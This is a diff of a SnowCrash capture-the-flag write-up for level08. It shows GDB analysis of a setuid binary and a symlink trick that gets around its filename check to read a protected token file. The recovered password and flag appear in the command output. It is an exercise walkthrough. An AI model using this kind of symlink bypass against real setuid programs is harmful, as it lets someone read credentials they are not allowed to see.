@@ -6,10 +6,14 @@ level08@SnowCrash:~$ ls -l
 total 16
 -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
 -rw-------  1 flag08 flag08    26 Mar  5  2016 token
+```
 
+```
 level08@SnowCrash:~$ ./level08
 ./level08 [file to read]
+```
 
+```
 level08@SnowCrash:~$ ./level08 token
 You may not access 'token'
 ```
@@ -17,8 +21,6 @@ You may not access 'token'
 
 - A binary has been left for us. Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
 ```
-level07@SnowCrash:~$ gdb ./level08
-...
 (gdb) info functions
 All defined functions:
 
@@ -29,6 +31,7 @@ Non-debugging symbols:
 0x080483b4  _init
 ...
 ```
+
 ```
 (gdb) disas main
 Dump of assembler code for function main:
@@ -140,31 +143,29 @@ End of assembler dump.
 ```
 
 
-- Let's see:
-```
-level08@SnowCrash:~$ echo test > /tmp/exploit
-level08@SnowCrash:~$ ./level08 /tmp/exploit
-test
-
-level08@SnowCrash:~$ ./level08 token
-You may not access 'token'
-```
-
-
-- So, the program checks its first parameter, if it contains the string `token`, `You may not access 'token'`, then `<exit@plt>` is displayed.
-Otherwise, it will attempt to open a file named with the value of its first parameter and will `<write@plt>` the contents of that file to the standard output with. Thus:
+- So, the program checks its first parameter, if it contains the string `token`, `You may not access 'token'` is displayed, then it `<exit@plt>`.
+Otherwise, it will attempt to open a file named with the value of its first parameter, and it will `<write@plt>` the contents of that file to the standard output with, so:
 ```
 level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/exploit
+```
+
+```
 level08@SnowCrash:~$ ./level08 /tmp/exploit
 quif5eloekouj29ke0vouxean
+```
 
+```
 level08@SnowCrash:~$ su flag08
 Password:quif5eloekouj29ke0vouxean
 Don't forget to launch getflag !
+```
 
+```
 flag08@SnowCrash:~$ getflag
 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+```
 
+```
 flag08@SnowCrash:~$ su level09
 Password:25749xKZ8L7DkSCwJkT9dyv6f
 level09@SnowCrash:~$
